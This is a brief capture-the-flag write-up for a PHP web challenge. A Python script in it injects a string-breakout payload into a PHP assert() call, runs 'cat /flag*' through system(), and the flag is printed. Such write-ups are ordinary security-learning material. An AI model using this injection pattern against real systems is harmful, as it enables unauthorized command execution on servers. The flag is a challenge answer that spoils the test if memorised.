https://ctftime.org/event/2396

# journal (web)

one file php challenge

## Solution

At first i thought there was some include path stuff.
But after trying every byte there were some interesting messages about assert.
And its apparently well known:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp

```python
import requests

payload = "file1.txt' and die(system(\"cat /flag*\")) or '"
res = requests.get("http://journal.chal.imaginaryctf.org/", params={"file":payload})
print(f"DEBUGPRINT[1]: go.py:14: res.text={res.text}")
```

## Flag
`ictf{assertion_failed_e3106922feb13b10}`

shafouz 2024/07/21
